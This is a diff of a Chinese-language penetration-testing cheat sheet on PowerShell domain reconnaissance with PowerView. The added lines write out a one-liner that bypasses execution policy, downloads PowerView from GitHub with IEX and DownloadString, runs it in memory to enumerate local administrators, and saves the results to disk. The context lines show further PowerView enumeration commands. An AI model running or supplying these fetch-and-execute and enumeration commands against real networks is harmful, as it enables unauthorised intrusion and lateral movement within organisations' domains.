@@ -35,6 +35,9 @@ Unrestricted
 但是如果我们只有cmd命令下,并且策略无法更改怎么办？？？
 powershell -exec bypass "import-module c:\powershell.ps1;Get-NetUser"
 
+powershell内存加载方式收集域内信息
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');Invoke-EnumerateLocalAdmin > C:\Programdata\test.txt"
+
 PS C:\> import-module .\powerview.ps1
 
 Get-NetDomain	//获取当前的域名称
